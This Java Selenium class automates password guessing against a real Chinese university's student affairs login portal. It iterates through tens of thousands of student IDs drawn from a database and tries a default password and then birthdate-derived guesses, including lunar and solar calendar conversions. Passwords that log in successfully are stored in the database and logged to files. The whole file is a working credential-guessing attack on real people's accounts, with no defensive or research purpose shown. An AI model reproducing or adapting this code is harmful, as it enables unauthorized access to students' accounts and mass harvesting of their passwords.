package com.ycs.selenium;

import javax.annotation.Resource;

import org.junit.Test;
import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.WebDriver;
import org.springframework.stereotype.Component;

import com.linux.GetDriver;
import com.ycs.model.service.StudentInfoService;
import com.ycs.util.DateUtil;
import com.ycs.util.MyUtil;
import com.ycs.util.SeleniumUtil;

@Component
public class JiaoWuPass{
	@Resource
	protected StudentInfoService studentInfoService;
	protected WebDriver driver;
	protected JavascriptExecutor jse;
	

	public void start() {
		System.out.println("start");
		driver=GetDriver.getDriver();
		jse = (JavascriptExecutor) driver;
	}
	public void shutdown(){
		System.out.println("shutdown");
		driver.quit();
	}
	public void restart(){
		System.out.println("restart");
		SeleniumUtil.fileWrite("driver.txt",MyUtil.getFormatDate(""));
		shutdown();
		start();
	}
	
	
	@Test
	public void startPass(int start,String name){
		try {
			start();
			int end=start+40000;
			String userName="";
			String userPass="";
			String restartPre="";
			String[] strs=new String[2];
			String deafult="";
			int ex=0;
			for(int id=start;id<end;id++){
				//浏览器重启机制
//				if(MyUtil.getFormatDate("mm").equals("00")||MyUtil.getFormatDate("mm").equals("30")){
//					if(!MyUtil.getFormatDate("mm").equals(restartPre)){
//						restart();
//						restartPre=MyUtil.getFormatDate("mm");
//					}
//				}

				//读取用户名和密码					
				strs=studentInfoService.getJiaowuPass(id);
				userName=strs[0];
				userPass=strs[1];

				//循环有可能的密码
				deafult=studentInfoService.getJiaowuPassDeafult(id);
				System.out.println(name+"A\t"+id+","+"Deafult--------------------------------------------------------------------------------");
				if(!login(id,userName,deafult,"Deafult",name)){
					System.out.println(name+"B\t"+id+","+"Data："+userPass.substring(2)+"--------------------------------------------------------------------------------");
					if(!login(id,userName,userPass.substring(2),"Data",name)){
						System.out.println(name+"C\t"+id+","+"Lunar："+DateUtil.solarToLunarString(userPass).substring(2)+"--------------------------------------------------------------------------------");
						if(!login(id,userName,DateUtil.solarToLunarString(userPass).substring(2),"Lunar",name)){
							System.out.println(name+"D\t"+id+","+"Solar："+DateUtil.lunarToSolarString(userPass).substring(2)+"--------------------------------------------------------------------------------");
							if(!login(id,userName,DateUtil.lunarToSolarString(userPass).substring(2),"Solar",name)){
								SeleniumUtil.fileWrite("pass"+name+".txt","\t"+id+"_"+userName+"_null"+MyUtil.getFormatDate("-dd_HH:mm:ss")+"\tNo Pass"+"^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^");
								System.out.println(name+"N\tNo Pass:"+id+"_"+userName+"_null"+"^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^");
							}
						}
					}
				}

				
			}
			
		} catch (Exception e) {
			e.printStackTrace();
		}finally{
			shutdown();
		}
	}
	
	
	public boolean login(int id,String userName,String userPass,String type,String name) throws InterruptedException{
		String url = "http://jiaowu.sicau.edu.cn/web/web/web/index.asp";
		String main="http://jiaowu.sicau.edu.cn/xuesheng/bangong/main/index1.asp";
		String pj="http://jiaowu.sicau.edu.cn/xuesheng/pj/pj/index.asp";
		driver.get(url);
		driver.findElement(By.xpath("//*[@id=\"username\"]")).sendKeys(userName);
		driver.findElement(By.xpath("//*[@id=\"password\"]")).sendKeys(userPass);
		driver.findElement(By.xpath("/html/body/div/div[3]/div/div/div[2]/fieldset/form/p[3]/input[1]")).click();
		driver.findElement(By.xpath("//*[@id=\"submit\"]")).click();
		
		System.out.println(driver.getCurrentUrl());
		if(driver.getCurrentUrl().equals(main)||driver.getCurrentUrl().equals(pj)){
			studentInfoService.updateJiaowuPass(id, userPass);
			SeleniumUtil.fileWrite("pass"+name+".txt",type+"\t"+id+"_"+userName+"_"+userPass+MyUtil.getFormatDate("-dd_HH:mm:ss")+"\tuserPass Ok"+"*****************************************");
			System.out.println(name+"T\tPass Yes:"+type+"\t"+id+"_"+userName+"_"+userPass+"*************************************************************************");
			return true;
		}else{
			System.out.println(name+"F\tPass No："+type+"\t"+id+"_"+userName+"_"+userPass+"#################################");
			return false;
		}
	}


	
	

	



}
